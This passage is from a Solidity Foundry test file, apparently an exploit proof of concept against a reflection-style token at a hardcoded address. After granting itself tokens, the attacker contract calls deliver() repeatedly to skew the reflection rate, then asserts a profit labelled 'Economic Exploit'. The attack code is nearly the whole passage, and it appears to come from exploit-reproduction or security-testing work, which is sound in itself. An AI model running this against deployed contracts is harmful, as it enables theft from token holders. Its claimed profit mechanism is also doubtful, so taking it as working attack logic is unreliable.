    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface ICoinToken {
    function balanceOf(address account) external view returns (uint256);
    function deliver(uint256 tAmount) external;
    function transfer(address recipient, uint256 amount) external returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x6bf3a93793e52f75543c92AfEC4636559988e3c1;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll use deal() in the exploit
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Get initial balance
        uint256 initialBalance = ICoinToken(TARGET).balanceOf(attacker);

        // Give attacker some tokens to work with
        deal(TARGET, attacker, 1000 * 10**18);

        // Record balance before exploit
        uint256 beforeBalance = ICoinToken(TARGET).balanceOf(attacker);

        // Call deliver() multiple times to manipulate reflection rate
        // We need to ensure we're not excluded (deliver() requires !_isExcluded)
        // Small amounts to minimize our own burn while affecting rate
        for (uint256 i = 0; i < 10; i++) {
            ICoinToken(TARGET).deliver(1 * 10**18);
        }

        // Check final balance
        uint256 afterBalance = ICoinToken(TARGET).balanceOf(attacker);

        // Verify balance increased
        assertGt(afterBalance, beforeBalance, "Balance should have increased");

        uint256 finalBalance = IERC20(TARGET).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
